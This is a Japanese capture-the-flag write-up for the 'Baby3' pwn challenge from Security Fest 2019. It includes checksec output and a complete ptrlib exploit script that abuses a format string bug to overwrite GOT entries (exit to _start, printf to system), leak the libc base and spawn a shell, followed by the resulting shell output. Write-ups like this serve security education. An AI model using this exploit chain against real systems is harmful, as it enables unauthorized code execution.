# [pwn 287pts] Baby3 - Security Fest 2019
64ビットでSSPが有効です。
```
$ checksec -f baby3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     Yes	0		4	baby3
```

今度はFSBがあります。
exitが呼ばれているのでこれをmainに変えてprintfをsystemに変えて...といういつもの手順でシェルを取りましょう。

この問題を機にptrlibにx64 FSBで複数アドレスに同時書き込みできる機能を追加しました。
```python
from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./baby3")
sock = Process("./baby3")
delta = 0xe7

# Stage 1: exit-->_start
payload = fsb(
    pos = 6,
    writes = {elf.got("exit"): elf.symbol("_start") & 0xffff},
    bs = 2,
    null = False,
    bits = 64
)
sock.recvuntil("input: ")
sock.sendline(payload)

# Stage 2: leak libc base
sock.recvuntil("input: ")
sock.sendline("%25$p")
addr_libc_start_main = int(sock.recvline(), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - delta
dump("libc base = " + hex(libc_base))

# Stage 3: printf-->system
payload = fsb(
    pos = 6,
    writes = {elf.got("printf"): libc_base + libc.symbol("system")},
    bs = 2,
    null = True,
    bits = 64
)
sock.recvuntil("input: ")
sock.sendline(payload)

# Stage 4: get the shell!
sock.sendline("/bin/sh\x00")

sock.interactive()
```

できました。
```
...
sh: 1: input:: not found
id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
ptrlib > pwntoolsの日も近い...！？